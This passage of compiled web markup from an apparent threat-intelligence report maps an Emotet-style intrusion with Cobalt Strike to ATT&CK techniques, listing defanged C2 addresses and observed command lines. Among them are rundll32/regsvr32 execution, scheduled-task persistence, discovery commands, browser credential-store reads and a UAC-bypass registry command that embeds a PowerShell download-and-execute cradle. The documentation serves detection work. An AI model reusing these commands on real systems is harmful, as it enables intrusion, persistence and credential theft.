",(0,l.kt)("inlineCode",{parentName:"td"},"pilotscience[.]com"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\PG102WY8\\\\L1KJS42TeHKjR8H[1].dll")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011",(0,l.kt)("br",null),"T1027"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Embedded Office Macro")," to execute ",(0,l.kt)("em",{parentName:"td"},".dll")," files via ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\Windows\\\\SysWow64\\\\rundll32.exe ..\\\\besta.ocx,D\\"&\\"l\\"&\\"l\\"&\\"R\\"&\\"eg\\"&\\"i\\"&\\"s\\"&\\"t\\"&\\"e\\"&\\"rS\\"&\\"e\\"&\\"rver'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\Windows\\\\SysWow64\\\\rundll32.exe ..\\\\bestb.ocx,D\\"&\\"l\\"&\\"l\\"&\\"R\\"&\\"eg\\"&\\"i\\"&\\"s\\"&\\"t\\"&\\"e\\"&\\"rS\\"&\\"e\\"&\\"rver')),(0,l.kt)("td",{parentName:"tr",align:null},"- .ocx file extensions correspond to ActiveX control modules",(0,l.kt)("br",null),"- The command-line shows an obfuscated parameter that resolves to the well known 'DllRegisterServer' function name.",(0,l.kt)("br",null),"- Variations on .ocx file name (besta.ocx and bestb.ocx) as observed in different investigations")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used nested invocations of ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\SysWOW64\\\\rundll32.exe \\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Bfzefze\\\\qoknamoiohhcrxw.oir\\",dIaBG'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\SysWOW64\\\\rundll32.exe \\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Bfzefze\\\\qoknamoiohhcrxw.oir\\",DllRegisterServer')),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,l.kt)("br",null),"T1036",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"HTTP connections")," to downloaded a masqueraded copy of ",(0,l.kt)("em",{parentName:"td"},"CERTUTIL")," for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"209.239.112[.]82"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"n/d"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\\\\\riboziydzd.exe"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\\\\\nfysitwtyygcw.exe")),(0,l.kt)("td",{parentName:"tr",align:null},"- riboziydzd.exe is not signed")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1547.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used Windows Registry Autorun keys for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RegKey Created"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"HKCU\\\\SOFTWARE\\\\MICROSOFT\\\\WINDOWS\\\\CURRENTVERSION\\\\RUN")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011",(0,l.kt)("br",null),"T1055"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," to launch and inject ",(0,l.kt)("em",{parentName:"td"},"CERTUTIL")," for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\\\\\nfysitwtyygcw.exe\\" /scomma \\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\8C0F.tmp\\"')),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003",(0,l.kt)("br",null),"T1106"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"CERTUTIL")," to access Web Browser credentials stores for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Read"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"API Invoked"),": ",(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"API Invoked"),": n/d",(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Modified"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\Users\\#{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{random}.default-release\\key4.db")),(0,l.kt)("td",{parentName:"tr",align:null},'- "',"\\","User Data","\\","Default","\\",'Login Data" is a SQlite3 database that stores the credentials of the Default profile',(0,l.kt)("br",null),"- Values are encrypted using Microsoft's Data Protection API (DPAPI)",(0,l.kt)("br",null),"- DPAPI consists of 2 functions -> CryptProtectData() and CryptUnprotectData() which symetrically encrypt/decrypt data.",(0,l.kt)("br",null),"- nfysitwtyygcw.exe is a copy of ",(0,l.kt)("em",{parentName:"td"},"CERTUTIL"),(0,l.kt)("br",null),"- CryptUnprotectData function decrypts data using implicit crypto keys tied to a specific user or system.",(0,l.kt)("br",null),"- key4.db is a SQLite database that stores passwords.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used HTTP to download ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," stager DLL for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Bfzefze\\\\uztmfjfrgicq.dll")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010",(0,l.kt)("br",null),"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"RegSvr32")," to execute Cobalt Strike Stager DLL for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\SysWOW64\\\\regsvr32.exe -s \\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Bfzefze\\\\uztmfjfrgicq.dll\\"'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"NamedPipe Connected"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"\\\\.\\pipe\\postex_b4a6"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"45.147.228[.]140"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"guvonuk[.]com")),(0,l.kt)("td",{parentName:"tr",align:null},"- The embedFilename of the dll is MsgBoxTest.exe",(0,l.kt)("br",null),"- NamedPipes are an inter-process communication mechanism on Windows.",(0,l.kt)("br",null),"- NamedPipe traffic that goes host-to-host is encapsulated within the SMB protocol.",(0,l.kt)("br",null),"- NamedPipe name pattern 'postex_","[a-z0-9]","{4}' matches one of the default NamedPipes used by Cobalt Strike.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used process injection into ",(0,l.kt)("em",{parentName:"td"},"mstsc.exe")," to launch Cobalt Strike post-exploitation tasks for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\mstsc.exe")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010",(0,l.kt)("br",null),"T1087.002",(0,l.kt)("br",null),"T1069",(0,l.kt)("br",null),"T1018",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to launch system native tools for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C ping #{domain}"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\SysWow64\\\\rundll32.exe"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C ping"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C wmic /NAMESPACE:\\\\\\\\root\\\\directory\\\\ldap PATH ds_user GET ds_mail"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C systeminfo"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net user"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup administrators"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C whoami"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_group where \"ds_samaccountname='Domain Admins'\" Get ds_member /Value")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used HTTP to downloaded additional Cobalt Strike ",(0,l.kt)("em",{parentName:"td"},"dll")," files for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\Temp\\\\log.dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\Saved Games\\\\log.dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\log.dll")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1053",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"SCHTASK")," to create an scheduled task that executes the Cobalt Strike beacon for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C SCHTASKS /create /tn \\"ObjectStoreRecoveryUpdateTask2\\" /tr \\"rundll32 C:\\\\Users\\\\#{user}\\\\Saved Games\\\\log.dll Helper pov\\" /sc minute /mo 35'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C SCHTASKS /run /TN \\"ObjectStoreRecoveryUpdateTask2\\"')),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"RunDll32 via an Scheduled Task")," to execute ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike Stager DLL")," for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\rundll32.EXE C:\\\\ProgramData\\\\log.dll helper pov")),(0,l.kt)("td",{parentName:"tr",align:null},"- This is result of the Persistence created before.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010",(0,l.kt)("br",null),"T1087.002",(0,l.kt)("br",null),"T1069",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to perform hands-on-keyboard discovery for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\mstsc.exe"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net group \\"administradores de dominio\\" /#{domain}'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net group \\"administradores dominio\\" /#{domain}'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup administrators"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup Administradoras"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net Administradoras de grupos locales"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net grupo local administradoras"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net user #{user} /#{domain}")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Privilege Escalation"),(0,l.kt)("td",{parentName:"tr",align:null},"T1548.002",(0,l.kt)("br",null),"T1112",(0,l.kt)("br",null),"T1059.001",(0,l.kt)("br",null),"T1087.002",(0,l.kt)("br",null),"T1069",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Reg.exe")," to attempt a known Elevation Control Mechanism bypass for Privilege Escalation."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C reg add HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command /d \\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -w hidden iex -c (New-Object Net.Webclient).DownloadString('http://127.0.0.1:3130/')\\\" /f"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net group \\"administradores de dominio\\" /#{domain}'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net group \\"administradores dominio\\" /#{domain}'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup administrators"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup Administradoras"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net Administradoras de grupos locales"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net grupo local administradoras"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net user")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003",(0,l.kt)("br",null),"T1047"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," for initiating command execution on remote hosts via ",(0,l.kt)("em",{parentName:"td"},"CMD")," and ",(0,l.kt)("em",{parentName:"td"},"WMIC")," for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cmd.exe /C wmic  /node:\\"DC01\\" /user:\\"DOMAIN\\\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin list shadows >> c:\\\\log.txt\\"')),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1047"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"WMIC via Cobalt Strike")," to list existing Volume Shadow Copies via ",(0,l.kt)("em",{parentName:"td"},"vssadmin.exe")," for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic  /node:\\"DC01\\" /user:\\"DOMAIN\\\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin list shadows >> c:\\\\log.txt\\"')),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used HTTP connections for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"116.124.128[.]206"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"n/d"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"imap.gmail.com")),(0,l.kt)("td",{parentName:"tr",align:null})))),(0,l.kt)("h2",{id:"ttp-profiles-with-observables"},"TTP Profiles with Observables"),(0,l.kt)("h3",{id:"threat-actor-used-email-with-xlsm-file-in-attachment-for-initial-access"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"Email")," with ",(0,l.kt)("em",{parentName:"h3"},".XLSM")," file in attachment for Initial Access."),(0,l.kt)("h4",{id:"tactic"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Initial Access")),(0,l.kt)("h4",{id:"techniques"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1566.001 - Phishing: Spearphishing Attachment")),(0,l.kt)("h4",{id:"behaviors-and-observables"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1566.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Outlook created weaponized .xlsm file in temp folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Content.Outlook\\\\A9JD1SAI\\\\Mensaje_08122021.xlsm"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Content.Outlook\\\\A9JD1SAI\\\\info_45373.xlsm"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Content.Outlook\\\\NO8YIFRV\\\\AVISO_612318667.xlsm"))))),(0,l.kt)("h4",{id:"notes"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"'AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook' indicates that file was received as an email attachment"),(0,l.kt)("li",{parentName:"ul"},"File name pattern is compatible with observed Emotet campaigns.")),(0,l.kt)("h3",{id:"threat-actor-used-weaponized-microsoft-office-files-for-execution"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"weaponized Microsoft Office files")," for Execution."),(0,l.kt)("h4",{id:"tactic-1"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques-1"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1204.002 - User Execution: Malicious File")),(0,l.kt)("h4",{id:"behaviors-and-observables-1"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002"),(0,l.kt)("td",{parentName:"tr",align:null},"Excel opened weaponized .xlsm file from Outlooks temp folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\Office16\\\\EXCEL.EXE\\" \\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Content.Outlook\\\\A9JD1SAI\\\\Mensaje_08122021.xlsm\\"'))))),(0,l.kt)("h4",{id:"notes-1"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"This observable indicates that the user has interacted with the weaponized document."),(0,l.kt)("li",{parentName:"ul"},".xlsm files are Microsoft Excel macro-enabled spreadsheet files.")),(0,l.kt)("h3",{id:"threat-actor-used-embedded-office-macro-to-download-dll-files-from-external-servers-for-command-and-control"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"Embedded Office Macro")," to download ",(0,l.kt)("em",{parentName:"h3"},".dll")," files from external servers for Command And Control."),(0,l.kt)("h4",{id:"tactic-2"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-2"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols"),(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables-2"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Excel performed network connection to public server."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"107.180.58[.]57"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": 